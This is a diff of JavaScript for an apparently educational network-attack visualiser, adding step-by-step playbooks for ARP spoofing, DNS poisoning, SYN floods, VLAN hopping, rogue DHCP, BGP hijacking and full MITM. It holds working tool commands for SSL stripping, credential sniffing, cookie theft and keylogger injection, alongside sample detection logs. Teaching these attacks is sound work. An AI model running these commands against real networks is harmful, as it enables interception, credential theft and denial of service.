-    nodes: ['attacker', 'victim', 'gateway', 'internet'],
-    attackFlow: 'mitm'
-  }
+const ATTACKS=[
+{id:'arp',name:'ARP Spoofing',sub:'Gateway Poisoning',layer:'L2',impact:9,stealth:7,complex:'MED',layerLabel:'Data Link',color:'#ff0033',
+mitre:{'Credential Access':['T1557 — MITM','T1040 — Network Sniffing'],'Collection':['T1557.002 — ARP Cache Poisoning']},
+tools:[{i:'🐍',n:'arpspoof',u:'Classic ARP poisoning — dsniff suite'},{i:'🦜',n:'Ettercap',u:'GUI MITM + plugin framework'},{i:'🔥',n:'Bettercap',u:'Modern all-in-one MITM'},{i:'⚗️',n:'Scapy',u:'Custom ARP packet crafting'}],
+packets:[{layer:'ETH',fields:{dst:'ff:ff:ff:ff:ff:ff',src:'de:ad:be:ef:00:01',type:'0x0806 (ARP)'}},{layer:'ARP',fields:{op:'2 (REPLY)',sha:'de:ad:be:ef:00:01',spa:'192.168.1.1  ← FORGED GATEWAY IP',tha:'aa:bb:cc:dd:ee:ff',tpa:'192.168.1.45'}}],
+phases:[
+{label:'PHASE 1 — RECONNAISSANCE',steps:[
+{t:'Network Discovery',d:'Identify live hosts, gateway IP, and victim MAC on local subnet.',cmd:'nmap -sn 192.168.1.0/24\narp -a'},
+{t:'ARP Table Inspection',d:'Map current IP→MAC relationships before poisoning — know what normal looks like.',cmd:'arp -a\nip neigh show'}]},
+{label:'PHASE 2 — WEAPONIZATION',steps:[
+{t:'Enable IP Forwarding',d:'Forward packets transparently — victim stays connected while you intercept everything.',cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward'},
+{t:'Craft Poison Packets',d:'Forge ARP REPLY: tell victim "I am the gateway" and gateway "I am the victim". Both update ARP cache.',cmd:''}]},
+{label:'PHASE 3 — EXPLOITATION',steps:[
+{t:'Launch ARP Poison',d:'Continuously flood both targets with forged ARP replies. Must be continuous — caches expire every 20-60s.',cmd:'arpspoof -i eth0 -t 192.168.1.45 192.168.1.1\narpspoof -i eth0 -t 192.168.1.1 192.168.1.45'},
+{t:'Capture Traffic',d:"All victim traffic routes through you before reaching gateway. You're invisible in the middle.",cmd:'tcpdump -i eth0 -w capture.pcap host 192.168.1.45'}]},
+{label:'PHASE 4 — POST-EXPLOITATION',steps:[
+{t:'Credential Harvest',d:'Strip credentials from HTTP, FTP, Telnet, IMAP, POP3 in plaintext.',cmd:'ettercap -T -r capture.pcap\nstrings capture.pcap | grep -i "pass\\|user"'},
+{t:'SSL Strip',d:'Downgrade HTTPS to HTTP. Victim sees unlocked padlock. You see plaintext passwords.',cmd:'bettercap -iface eth0 -eval "arp.spoof on; http.proxy on"'}]}],
+detLogs:[{t:'warn',m:'[ARP] Duplicate IP: 192.168.1.1 claims 2 different MAC addresses'},{t:'alert',m:'[IDS] ARP storm: 1200 gratuitous replies/sec from 192.168.1.99'},{t:'warn',m:'[NET] Gateway MAC changed: aa:bb:cc → de:ad:be:ef'},{t:'alert',m:'[SOC] MITM indicator: ARP cache poisoning pattern confirmed'}],
+nodes:['attacker','victim','gateway','internet'],flow:'arp'},
+
+{id:'dns',name:'DNS Poisoning',sub:'Cache Injection',layer:'L7',impact:8,stealth:9,complex:'HIGH',layerLabel:'Application',color:'#cc00ff',
+mitre:{'Initial Access':['T1189 — Drive-by Compromise'],'Collection':['T1040 — Network Sniffing','T1185 — Session Hijack'],'Defense Evasion':['T1557 — MITM']},
+tools:[{i:'🎭',n:'dnsspoof',u:'DNS response spoofing'},{i:'🔥',n:'Bettercap',u:'dns.spoof module'},{i:'👹',n:'Responder',u:'LLMNR/NBT-NS/DNS poisoning'},{i:'⚗️',n:'Scapy',u:'Custom DNS packet crafting'}],
+packets:[{layer:'UDP',fields:{src:'192.168.1.99:53',dst:'192.168.1.45:54321',broadcast:'no — targeted response'}},{layer:'DNS',fields:{id:'0xABCD (matches victim query)','qr':'1 (RESPONSE)',aa:'1 (Authoritative — lie)',qname:'bank.com',qtype:'A',rdata:'192.168.1.99  ← ATTACKER IP'}}],
+phases:[
+{label:'PHASE 1 — POSITIONING',steps:[
+{t:'Establish MITM',d:'DNS poisoning requires intercepting queries. Get on-path via ARP spoof first.',cmd:'bettercap -iface eth0 -eval "arp.spoof on; net.probe on"'},
+{t:'Identify DNS Server',d:"Find victim's DNS resolver — usually the gateway or ISP resolver.",cmd:"cat /etc/resolv.conf\nnmap -sU -p53 192.168.1.1"}]},
+{label:'PHASE 2 — SPOOF SETUP',steps:[
+{t:'Create Fake DNS Entries',d:'Map target domains to your malicious IP where your cloned site runs.',cmd:'# hosts.txt\n192.168.1.99  bank.com\n192.168.1.99  paypal.com\n192.168.1.99  mail.google.com'},
+{t:'Deploy Cloned Site',d:'Clone target website to capture credentials from redirected victims.',cmd:'python3 -m http.server 80\n# or SET (Social Engineering Toolkit) for full clones'}]},
+{label:'PHASE 3 — INJECTION',steps:[
+{t:'Race the Resolver',d:'Watch for DNS queries. Reply with forged answer before legitimate resolver. First reply wins — victim uses your IP.',cmd:'dnsspoof -i eth0 -f hosts.txt'},
+{t:'Kaminsky Cache Poisoning',d:'Inject forged records directly into resolver cache. Persists until TTL expires — hours of access.',cmd:'bettercap -eval "dns.spoof.domains bank.com,paypal.com; dns.spoof on"'}]},
+{label:'PHASE 4 — HARVEST',steps:[
+{t:'Credential Capture',d:'Victims browse your clone believing it is legitimate. Capture POST credentials silently.',cmd:"tcpdump -i eth0 port 80 -A | grep -i 'POST\\|password'"},
+{t:'Cache Persistence',d:'Poisoned entries persist until TTL expires (minutes to hours). Victim keeps hitting your server automatically.',cmd:''}]}],
+detLogs:[{t:'info',m:'[DNS] Query: 192.168.1.45 → bank.com (type A)'},{t:'alert',m:'[DNS] Spoofed response: bank.com → 192.168.1.99 (expected 13.225.x.x)'},{t:'warn',m:'[IDS] DNS answer arrived before query reached resolver'},{t:'alert',m:'[SOC] DNS poisoning confirmed — Kaminsky signature'}],
+nodes:['attacker','victim','dns','internet'],flow:'dns'},
+
+{id:'syn',name:'SYN Flood',sub:'TCP DoS Attack',layer:'L4',impact:10,stealth:3,complex:'LOW',layerLabel:'Transport',color:'#ff6600',
+mitre:{'Impact':['T1498 — Network DoS','T1498.001 — Direct Network Flood'],'Resource Dev':['T1583 — Acquire Infrastructure']},
+tools:[{i:'💥',n:'hping3',u:'SYN flood with IP spoofing'},{i:'⚗️',n:'Scapy',u:'Custom TCP SYN packet flood'},{i:'⚡',n:'LOIC',u:'Low Orbit Ion Cannon'},{i:'🤖',n:'Botnet C2',u:'Distributed DDoS coordination'}],
+packets:[{layer:'IP',fields:{src:'RANDOM SPOOFED IPs  ← key technique',dst:'192.0.2.100',ttl:'64',proto:'TCP (6)'}},{layer:'TCP',fields:{sport:'RANDOM 1024-65535',dport:'80',seq:'RANDOM',flags:'SYN only — ACK never comes',window:'65535'}}],
+phases:[
+{label:'PHASE 1 — TARGET ANALYSIS',steps:[
+{t:'Identify Target Service',d:'Find open TCP ports. Web server (80/443) has largest attack surface and most impact.',cmd:'nmap -sS -p 80,443,22 192.0.2.100'},
+{t:'Measure Connection Queue',d:'Default Linux backlog = 128 connections. SYN flood fills this in milliseconds at high rate.',cmd:'ss -lnt | grep :80\nsysctl net.ipv4.tcp_max_syn_backlog'}]},
+{label:'PHASE 2 — WEAPONIZATION',steps:[
+{t:'Configure IP Spoofing',d:'Randomize source IPs — SYN-ACK replies scatter to random hosts on the internet. Target waits 75s for ACK that never comes.',cmd:''},
+{t:'Calculate Required Rate',d:'Rate must exceed: (connection timeout) ÷ (backlog size). Need ~1000+ SYNs/sec to sustain attack on modern Linux.',cmd:''}]},
+{label:'PHASE 3 — FLOOD',steps:[
+{t:'Launch SYN Flood',d:'Target allocates state for each SYN (memory + CPU). Sends SYN-ACK to nobody. Waits. Connection table fills. Legitimate users get rejected.',cmd:'hping3 -S --flood -V -p 80 --rand-source 192.0.2.100'},
+{t:'Distributed Amplification',d:'Botnet or reflectors amplify attack. Spoof victim IP, flood open TCP services — thousands of SYN-ACKs hit victim simultaneously.',cmd:''}]},
+{label:'PHASE 4 — IMPACT',steps:[
+{t:'Service Down',d:'Target drops all new connections. CPU maxes on SYN processing. Legit users timeout. Full DoS confirmed.',cmd:'ss -s\nnetstat -an | grep SYN_RECV | wc -l'},
+{t:'Attribution Resistance',d:'Millions of random spoofed IPs. Looks like traffic from every country. Near-impossible to trace without ISP cooperation.',cmd:''}]}],
+detLogs:[{t:'alert',m:'[NET] Anomaly: 80,000 SYN/sec to port 80 — baseline is ~50/sec'},{t:'alert',m:'[FW] Connection table 99% full — dropping legitimate connections'},{t:'warn',m:'[SYS] TCP backlog overflow — SYN cookies activated'},{t:'alert',m:'[SOC] DDoS confirmed: SYN flood from 15,000+ spoofed IPs'}],
+nodes:['attacker','internet','target','botnet'],flow:'syn'},
+
+{id:'vlan',name:'VLAN Hopping',sub:'Switch Exploitation',layer:'L2',impact:8,stealth:9,complex:'HIGH',layerLabel:'Data Link',color:'#00ffff',
+mitre:{'Lateral Movement':['T1599 — Network Boundary Bridging','T1599.001 — NAT Traversal'],'Discovery':['T1046 — Network Service Discovery']},
+tools:[{i:'🦎',n:'Yersinia',u:'Layer 2 protocol attacks (DTP/STP)'},{i:'⚗️',n:'Scapy',u:'Double-tagged 802.1Q frames'},{i:'🔧',n:'frogger.py',u:'VLAN hopping automation'},{i:'📡',n:'Wireshark',u:'Cross-VLAN capture'}],
+packets:[{layer:'ETH',fields:{dst:'00:00:0c:cc:cc:cc',src:'de:ad:be:ef:00:01',type:'0x8100 (802.1Q)'}},{layer:'802.1Q outer',fields:{pcp:'0',dei:'0',vid:'1  ← attacker native VLAN (stripped by first switch)'}},{layer:'802.1Q inner',fields:{pcp:'0',dei:'0',vid:'10  ← TARGET VLAN (forwarded by second switch)'}},{layer:'IP',fields:{dst:'10.0.10.50  ← host in target VLAN',src:'192.168.1.99'}}],
+phases:[
+{label:'PHASE 1 — ENUMERATION',steps:[
+{t:'Detect DTP',d:'Many Cisco switches run DTP (Dynamic Trunking Protocol) by default — auto-negotiate trunks.',cmd:'yersinia dtp -attack 1\n# Listen for DTP frames — detects trunk-capable ports'},
+{t:'Identify Target VLAN',d:'Map which VLANs hold sensitive assets: VLAN 10 = servers, VLAN 20 = finance, VLAN 30 = guest.',cmd:'nmap --script=broadcast-listener -e eth0'}]},
+{label:'PHASE 2 — SWITCH SPOOFING',steps:[
+{t:'Negotiate Trunk',d:"Send DTP Desirable frames — convince switch your port is another switch's trunk. Switch promotes to trunk mode.",cmd:'yersinia dtp -attack 3'},
+{t:'Receive All VLANs',d:'Once trunked, your NIC gets traffic from ALL VLANs simultaneously. Complete network visibility.',cmd:'ip link add link eth0 name eth0.10 type vlan id 10\nip link set eth0.10 up\ndhclient eth0.10'}]},
+{label:'PHASE 3 — DOUBLE TAGGING',steps:[
+{t:'Craft Double-Tagged Frame',d:'Stack two 802.1Q tags. First switch strips outer tag, forwards inner-tagged frame to target VLAN. Works even without trunk negotiation.',cmd:"python3 -c \"from scapy.all import *\npkt=Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst='10.0.10.50')/ICMP()\nsendp(pkt,iface='eth0')\""},
+{t:'One-Way Access',d:'Packets reach target VLAN hosts. Replies need full trunk for return path. Combine with trunk negotiation for full bidirectional access.',cmd:''}]},
+{label:'PHASE 4 — PIVOT',steps:[
+{t:'Lateral Movement',d:'From target VLAN: attack servers, steal credentials, access systems that were supposed to be isolated.',cmd:'nmap -sV 10.0.10.0/24  # Discover previously hidden hosts'},
+{t:'Segmentation Bypass',d:'VLAN isolation defeated. Guest WiFi VLAN can now reach Finance VLAN. Common in enterprises relying on VLANs as only security layer.',cmd:''}]}],
+detLogs:[{t:'warn',m:'[SW] Unexpected DTP frame received on access port Gi0/12'},{t:'alert',m:'[SW] Double-tagged 802.1Q frame detected on access port'},{t:'warn',m:'[NET] Trunk link negotiated on Gi0/12 — not designated trunk'},{t:'alert',m:'[SOC] Cross-VLAN traffic anomaly: 192.168.1.99 → VLAN 10'}],
+nodes:['attacker','switch','vlan10','vlan20'],flow:'vlan'},
+
+{id:'dhcp',name:'DHCP Starvation',sub:'Rogue Server Setup',layer:'L2',impact:7,stealth:6,complex:'LOW',layerLabel:'Data Link',color:'#ffcc00',
+mitre:{'Initial Access':['T1200 — Hardware Additions'],'Impact':['T1498 — Network DoS'],'Collection':['T1557 — MITM via Rogue DHCP']},
+tools:[{i:'🦴',n:'Yersinia',u:'DHCP starvation flood'},{i:'💀',n:'dhcpstarv',u:'DHCP pool exhaustion'},{i:'🏚',n:'isc-dhcp-server',u:'Rogue DHCP daemon'},{i:'🔥',n:'Metasploit',u:'auxiliary/server/dhcp'}],
+packets:[{layer:'UDP',fields:{src:'0.0.0.0:68',dst:'255.255.255.255:67',broadcast:'yes — LAN-wide'}},{layer:'DHCP DISCOVER',fields:{msg_type:'1 (DISCOVER)',chaddr:'de:ad:be:ef:XX:XX  ← random spoofed MAC',hostname:'random-host',params:'request IP, subnet, GW, DNS'}}],
+phases:[
+{label:'PHASE 1 — STARVATION',steps:[
+{t:'Exhaust DHCP Pool',d:'Flood server with DISCOVER requests using random spoofed MACs. Server assigns all IPs to ghost MACs in seconds.',cmd:'yersinia dhcp -attack 1\n# or: dhcpstarv -i eth0'},
+{t:'Verify Exhaustion',d:'Pool full = legitimate clients denied IP = network DoS. Verify no leases available.',cmd:'nmap --script broadcast-dhcp-discover\n# Should return: no free leases'}]},
+{label:'PHASE 2 — ROGUE SERVER',steps:[
+{t:'Configure Rogue DHCP',d:"Set gateway + DNS to your IP. Every new client will route all traffic through you.",cmd:'# /etc/dhcp/dhcpd.conf\nsubnet 192.168.1.0 netmask 255.255.255.0 {\n  range 192.168.1.200 192.168.1.250;\n  option routers 192.168.1.99;             # YOU\n  option domain-name-servers 192.168.1.99; # YOU\n}'},
+{t:'Start Server + Forwarding',d:'Forward traffic so victims stay connected — invisible MITM.',cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward\nservice isc-dhcp-server start'}]},
+{label:'PHASE 3 — VICTIM CAPTURE',steps:[
+{t:'Victims Accept Lease',d:'New/reconnecting devices broadcast DISCOVER → your server replies first → victim uses your gateway and DNS.',cmd:''},
+{t:'Full Traffic Intercept',d:'Every packet from every victim flows through you. DNS queries come to you. Complete visibility.',cmd:'tcpdump -i eth0 -w rogue.pcap\nbettercap -eval "net.sniff on"'}]},
+{label:'PHASE 4 — COMBINED ATTACK',steps:[
+{t:'Rogue DNS Poisoning',d:"You're the DNS server — resolve any domain to any IP. Victims can't detect it. Perfect phishing setup.",cmd:'bettercap -eval "dns.spoof.domains *; dns.spoof on"'},
+{t:'Persistence',d:'DHCP leases typically last 24h. Victims auto-renew — your MITM position persists automatically.',cmd:'ettercap -T -q -i eth0'}]}],
+detLogs:[{t:'alert',m:'[DHCP] Pool exhaustion: 254/254 leases consumed in 6 seconds'},{t:'alert',m:'[DHCP] Rogue DHCP server detected: 192.168.1.99 issuing leases'},{t:'warn',m:'[NET] 14 clients received 192.168.1.99 as default GW simultaneously'},{t:'stealth',m:'[SOC] Full MITM via rogue DHCP — clients trust attacker as GW+DNS'}],
+nodes:['attacker','victim','gateway','dhcp'],flow:'dhcp'},
+
+{id:'bgp',name:'BGP Hijacking',sub:'Route Injection',layer:'L3',impact:10,stealth:8,complex:'HIGH',layerLabel:'Network',color:'#0066ff',
+mitre:{'Initial Access':['T1590 — Gather Victim Network Info'],'Impact':['T1498 — Network DoS','T1565 — Data Manipulation'],'Collection':['T1040 — Sniffing at Internet Scale']},
+tools:[{i:'🌐',n:'BIRD',u:'BGP daemon for route injection'},{i:'🦓',n:'FRRouting',u:'Open source BGP router'},{i:'📡',n:'ExaBGP',u:'BGP announcement tool'},{i:'🔍',n:'BGPmon',u:'BGP hijack detection'}],
+packets:[{layer:'TCP',fields:{sport:'49152',dport:'179 (BGP)',flags:'BGP session on established TCP'}},{layer:'BGP UPDATE',fields:{type:'2 (UPDATE)',withdrawn:'none',nlri:'8.8.8.0/25  ← more specific than /24',next_hop:'203.0.113.1  ← attacker',as_path:'65001  ← attacker AS only'}}],
+phases:[
+{label:'PHASE 1 — INTELLIGENCE',steps:[
+{t:'Identify Target ASN',d:'Find ASN and IP prefixes of target. BGP routing is publicly visible — anyone can query looking glasses.',cmd:'whois -h whois.radb.net 8.8.8.0/24\nbgp.he.net  # AS visualization'},
+{t:'Map Upstream Peers',d:'Find which ISPs peer with target AS. These are propagation paths for your injected route.',cmd:'traceroute 8.8.8.8  # Each hop = AS boundary'}]},
+{label:'PHASE 2 — ROUTE INJECTION',steps:[
+{t:'Announce More-Specific Prefix',d:'BGP longest-prefix match: /25 beats /24. Announce /25 → routers prefer your route. Traffic from affected regions hits your AS.',cmd:'# exabgp config\nneighbor 203.0.113.1 {\n  local-as 65001; peer-as 65002;\n  announce 8.8.8.0/25 next-hop self;\n}'},
+{t:'Propagation',d:'Route spreads across internet via BGP within minutes. Affected regions now send traffic to you.',cmd:''}]},
+{label:'PHASE 3 — INTERCEPTION',steps:[
+{t:'Intercept at Scale',d:'Traffic destined for hijacked prefix arrives at your AS. Affects real users globally.',cmd:'tcpdump -i eth0 net 8.8.8.0/25'},
+{t:'Transparent Forward',d:'Forward to real destination after inspection — users see slight latency increase. Invisible internet-scale MITM.',cmd:'ip route add 8.8.8.0/25 via <real-next-hop>'}]},
+{label:'PHASE 4 — REAL-WORLD IMPACT',steps:[
+{t:'Historical Attacks',d:'2018: Amazon Route53 BGP hijack → $150K crypto stolen in 2hrs. 2010: China Telecom hijacked 15% of internet traffic for 18min. Both undetected for extended periods.',cmd:''},
+{t:'Black-Hole DoS',d:'Announce prefix but drop all traffic. Entire IP range goes dark for affected regions. Nation-state grade DoS with no attack traffic at target.',cmd:'ip route add blackhole 8.8.8.0/25'}]}],
+detLogs:[{t:'warn',m:'[BGP] New announcement: 8.8.8.0/25 from AS65001 (unexpected origin)'},{t:'alert',m:'[BGP] Prefix hijack: /25 more-specific overrides legitimate /24'},{t:'alert',m:'[NOC] Traffic rerouted through AS65001 — unrecognized ASN'},{t:'warn',m:'[RPKI] Route Origin Validation FAILED for 8.8.8.0/25'}],
+nodes:['attacker','isp1','isp2','internet'],flow:'bgp'},
+
+{id:'mitm',name:'Full MITM',sub:'Complete Interception',layer:'L2-L7',impact:10,stealth:6,complex:'HIGH',layerLabel:'All Layers',color:'#ff006e',
+mitre:{'Credential Access':['T1557 — Adversary-in-the-Middle','T1040 — Network Sniffing'],'Collection':['T1185 — Browser Session Hijacking'],'Defense Evasion':['T1553 — Subvert Trust Controls']},
+tools:[{i:'🔥',n:'Bettercap',u:'All-in-one MITM framework'},{i:'🦜',n:'Ettercap',u:'Classic MITM + sniffing'},{i:'🕷',n:'mitmproxy',u:'HTTP/S interception proxy'},{i:'🔐',n:'SSLstrip',u:'HTTPS→HTTP downgrade'}],
+packets:[{layer:'ETH',fields:{src:'de:ad:be:ef:00:01  ← ATTACKER',dst:'aa:bb:cc:dd:ee:ff',note:'victim thinks this is the gateway MAC'}},{layer:'HTTP POST',fields:{host:'bank.com  ← victim thinks HTTPS',path:'/login',body:'username=victim&password=s3cr3t  ← PLAINTEXT',note:'SSL stripped by attacker'}}],
+phases:[
+{label:'PHASE 1 — POSITION',steps:[
+{t:'ARP + DHCP Combo',d:'ARP spoof catches existing connections. Rogue DHCP catches new connections. Combined = full subnet coverage.',cmd:'bettercap -iface eth0 -eval "arp.spoof on; dhcp.spoof on; net.probe on"'},
+{t:'Transparent Forwarding',d:'Forward all traffic so victims maintain connectivity. Zero service disruption = zero suspicion.',cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080'}]},
+{label:'PHASE 2 — SSL ATTACK',steps:[
+{t:'SSL Strip',d:'Intercept HTTPS redirects. Serve HTTP to victim, maintain HTTPS to server. Victim sees padlock disappear.',cmd:'bettercap -eval "http.proxy on; set http.proxy.sslstrip true"'},
+{t:'HSTS Bypass',d:'HSTS-protected sites immune to SSL strip. Bypass via DNS spoof to typosquat (gooogle.com) or non-preloaded subdomains.',cmd:'bettercap -caplet hstshijack/hstshijack'}]},
+{label:'PHASE 3 — HARVEST',steps:[
+{t:'Credential Sniffer',d:'Auto-extract creds from HTTP POST, FTP AUTH, Telnet, IMAP LOGIN, POP3 USER/PASS in real time.',cmd:'bettercap -eval "net.sniff on; net.sniff.verbose true"'},
+{t:'Session Cookie Theft',d:"Steal authenticated session cookies. Replay in your browser — you're logged in as victim without knowing password.",cmd:'bettercap -caplet http-req-dump.cap\n# Extract Set-Cookie from responses'}]},
+{label:'PHASE 4 — INJECTION',steps:[
+{t:'JavaScript Injection',d:'Inject malicious JS into every HTTP page victim loads. Keyloggers, BeEF browser hooks, crypto miners.',cmd:'bettercap -eval "inject.js on; set inject.js.src /keylogger.js"'},
+{t:'Persistent Access',d:'Harvested VPN creds, SSH keys, session tokens → lateral movement to internal systems → establish persistence.',cmd:''}]}],
+detLogs:[{t:'alert',m:'[TLS] Certificate mismatch for bank.com — possible SSL proxy'},{t:'warn',m:'[HSTS] Bypass attempt on mail.google.com via DNS spoof'},{t:'alert',m:'[IDS] ARP spoof + HTTP proxy combo from 192.168.1.99'},{t:'alert',m:'[SOC] Full MITM confirmed — credential harvest active'}],
+nodes:['attacker','victim','gateway','internet'],flow:'mitm'}
 ];
 
-// ══════════════════════════════════════════════
-// STATE
-// ══════════════════════════════════════════════
-let currentAttack = null;
-let animating = false;
-let animFrame = null;
-let particles = [];
-let progress = 0;
-let progressInterval = null;
-
-// ══════════════════════════════════════════════
-// CANVAS SETUP
-// ══════════════════════════════════════════════
-const canvas = document.getElementById('netCanvas');
-const ctx = canvas.getContext('2d');
-
-function resizeCanvas() {
-  canvas.width = canvas.offsetWidth;
-  canvas.height = canvas.offsetHeight;
-}
-
-window.addEventListener('resize', () => { resizeCanvas(); drawNetwork(); });
-
-// Node definitions
-const NODE_CONFIGS = {
-  attacker: { label: 'ATTACKER', color: '#ff2d2d', icon: '☠', x: 0.12, y: 0.5 },
-  victim:   { label: 'VICTIM',   color: '#ffab00', icon: '💻', x: 0.88, y: 0.3 },
-  gateway:  { label: 'GATEWAY',  color: '#00e5ff', icon: '⬡', x: 0.5,  y: 0.5 },
-  internet: { label: 'INTERNET', color: '#8ba3b8', icon: '🌐', x: 0.88, y: 0.7 },
-  dns:      { label: 'DNS SRV',  color: '#00e676', icon: '📡', x: 0.5,  y: 0.2 },
-  target:   { label: 'TARGET',   color: '#ff6b6b', icon: '🖥', x: 0.88, y: 0.5 },
-  botnet:   { label: 'BOTNET',   color: '#ff6d00', icon: '🤖', x: 0.12, y: 0.2 },
-  switch:   { label: 'SWITCH',   color: '#00e5ff', icon: '⬡', x: 0.5,  y: 0.5 },
-  vlan10:   { label: 'VLAN 10',  color: '#00e676', icon: '🖥', x: 0.75, y: 0.25 },
-  vlan20:   { label: 'VLAN 20',  color: '#ffab00', icon: '🖥', x: 0.75, y: 0.75 },
-  dhcp:     { label: 'DHCP SRV', color: '#00e676', icon: '📦', x: 0.5,  y: 0.2 },
-  isp1:     { label: 'ISP-A',    color: '#00e5ff', icon: '🔌', x: 0.35, y: 0.3 },
-  isp2:     { label: 'ISP-B',    color: '#00e5ff', icon: '🔌', x: 0.35, y: 0.7 },
+const NODES={
+attacker:{l:'ATTACKER',c:'#ff0033',i:'☠',x:0.12,y:0.5},
+victim:{l:'VICTIM',c:'#ffcc00',i:'💻',x:0.88,y:0.28},
+gateway:{l:'GATEWAY',c:'#00ffff',i:'⬡',x:0.5,y:0.5},
+internet:{l:'INTERNET',c:'#333',i:'🌐',x:0.88,y:0.72},
+dns:{l:'DNS SRV',c:'#00ff41',i:'📡',x:0.5,y:0.18},
+target:{l:'TARGET',c:'#ff6600',i:'🖥',x:0.88,y:0.5},
+botnet:{l:'BOTNET',c:'#ff6600',i:'🤖',x:0.12,y:0.2},
+switch:{l:'SWITCH',c:'#00ffff',i:'⬡',x:0.5,y:0.5},
+vlan10:{l:'VLAN 10',c:'#00ff41',i:'🖥',x:0.78,y:0.22},
+vlan20:{l:'VLAN 20',c:'#ffcc00',i:'🖥',x:0.78,y:0.78},
+dhcp:{l:'DHCP SRV',c:'#00ff41',i:'📦',x:0.5,y:0.18},
+isp1:{l:'ISP-A',c:'#00ffff',i:'🔌',x:0.38,y:0.28},
+isp2:{l:'ISP-B',c:'#00ffff',i:'🔌',x:0.38,y:0.72},
 };
 
-function getNodePos(nodeId) {
-  const cfg = NODE_CONFIGS[nodeId];
-  return { x: canvas.width * cfg.x, y: canvas.height * cfg.y };
-}
-
-function drawNode(nodeId, highlight=false) {
-  const cfg = NODE_CONFIGS[nodeId];
-  const pos = getNodePos(nodeId);
-  const r = 28;
-
-  // Glow
-  if (highlight) {
-    ctx.save();
-    ctx.shadowBlur = 25;
-    ctx.shadowColor = cfg.color;
-    ctx.restore();
-  }
-
-  // Circle
-  ctx.beginPath();
-  ctx.arc(pos.x, pos.y, r, 0, Math.PI*2);
-  ctx.fillStyle = highlight ? cfg.color + '33' : '#0c1620';
-  ctx.fill();
-  ctx.strokeStyle = highlight ? cfg.color : '#1a3a50';
-  ctx.lineWidth = highlight ? 2 : 1;
-  ctx.stroke();
-
-  // Icon
-  ctx.font = '16px serif';
-  ctx.textAlign = 'center';
-  ctx.textBaseline = 'middle';
-  ctx.fillText(cfg.icon, pos.x, pos.y - 2);
-
-  // Label
-  ctx.font = '600 9px "Rajdhani", sans-serif';
-  ctx.fillStyle = highlight ? cfg.color : '#4a6578';
-  ctx.fillText(cfg.label, pos.x, pos.y + r + 12);
-}
-
-function drawEdge(fromId, toId, color='#1a3a50', dashed=false) {
-  const from = getNodePos(fromId);
-  const to = getNodePos(toId);
-  ctx.beginPath();
-  ctx.moveTo(from.x, from.y);
-  ctx.lineTo(to.x, to.y);
-  ctx.strokeStyle = color;
-  ctx.lineWidth = dashed ? 1 : 1;
-  if (dashed) ctx.setLineDash([4,4]);
-  else ctx.setLineDash([]);
-  ctx.stroke();
-  ctx.setLineDash([]);
-}
-
-// Particle system
-function spawnParticle(fromId, toId, color) {
-  const from = getNodePos(fromId);
-  const to = getNodePos(toId);
-  particles.push({ x: from.x, y: from.y, tx: to.x, ty: to.y, progress: 0, speed: 0.012 + Math.random()*0.01, color, size: 3 + Math.random()*2 });
-}
-
-function updateParticles() {
-  particles = particles.filter(p => p.progress < 1);
-  particles.forEach(p => {
-    p.progress = Math.min(1, p.progress + p.speed);
-    p.x = lerp(p.x, p.tx, p.speed * 3);
-    p.y = lerp(p.y, p.ty, p.speed * 3);
-  });
-}
-
-function lerp(a, b, t) { return a + (b - a) * t; }
-
-function drawParticles() {
-  particles.forEach(p => {
-    ctx.beginPath();
-    ctx.arc(p.x, p.y, p.size, 0, Math.PI*2);
-    ctx.fillStyle = p.color;
-    ctx.shadowBlur = 10;
-    ctx.shadowColor = p.color;
-    ctx.fill();
-    ctx.shadowBlur = 0;
-  });
-}
-
-// Attack-specific flows
-const FLOWS = {
-  arp:  [['attacker','gateway','#ff2d2d'], ['attacker','victim','#ff2d2d'], ['victim','attacker','#ffab00']],
-  dns:  [['attacker','victim','#ff2d2d'], ['victim','dns','#00e5ff'], ['attacker','dns','#ff2d2d'], ['victim','attacker','#ffab00']],
-  syn:  [['attacker','target','#ff2d2d'], ['botnet','target','#ff6d00'], ['attacker','internet','#ff2d2d']],
-  vlan: [['attacker','switch','#ff2d2d'], ['switch','vlan10','#00e5ff'], ['attacker','vlan20','#ff2d2d']],
-  dhcp: [['attacker','victim','#ff2d2d'], ['attacker','gateway','#ff2d2d'], ['victim','attacker','#ffab00']],
-  bgp:  [['attacker','isp1','#ff2d2d'], ['attacker','isp2','#ff2d2d'], ['isp1','internet','#ff6d00'], ['isp2','internet','#ff6d00']],
-  mitm: [['attacker','victim','#ff2d2d'], ['attacker','gateway','#ff2d2d'], ['victim','attacker','#ffab00'], ['attacker','internet','#ff6d00']],
+const FLOWS={
+arp:[['attacker','gateway','#ff0033'],['attacker','victim','#ff0033'],['victim','attacker','#ffcc00']],
+dns:[['attacker','victim','#cc00ff'],['victim','dns','#00ffff'],['attacker','dns','#cc00ff']],
+syn:[['attacker','target','#ff6600'],['botnet','target','#ff6600'],['attacker','internet','#ff6600']],
+vlan:[['attacker','switch','#00ffff'],['switch','vlan10','#00ffff'],['attacker','vlan20','#ff0033']],
+dhcp:[['attacker','victim','#ffcc00'],['attacker','gateway','#ffcc00'],['victim','attacker','#ff0033']],
+bgp:[['attacker','isp1','#0066ff'],['attacker','isp2','#0066ff'],['isp1','internet','#0066ff'],['isp2','internet','#0066ff']],
+mitm:[['attacker','victim','#ff006e'],['attacker','gateway','#ff006e'],['victim','attacker','#ffcc00'],['attacker','internet','#ff006e']],
 };
 
-let frameCount = 0;
+const cv=document.getElementById('nc'),ctx=cv.getContext('2d');
+let parts=[],fN=0,animating=false,raf=null,currentAtk=null,prog=0,pt=null;
 
-function drawNetwork() {
-  if (!canvas.width) return;
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
+function resizeCv(){cv.width=cv.offsetWidth;cv.height=cv.offsetHeight;}
+window.addEventListener('resize',()=>{resizeCv();draw();});
 
-  if (!currentAttack) {
-    // Default static network
-    const defaultNodes = ['attacker','victim','gateway','internet'];
-    drawEdge('attacker','gateway'); drawEdge('gateway','victim'); drawEdge('gateway','internet');
-    defaultNodes.forEach(n => drawNode(n, false));
+function npos(id){const n=NODES[id];return{x:cv.width*n.x,y:cv.height*n.y};}
+
+function drawNode(id,glow){
+  const n=NODES[id],p=npos(id),r=22;
+  ctx.save();
+  if(glow){ctx.shadowBlur=18;ctx.shadowColor=n.c;}
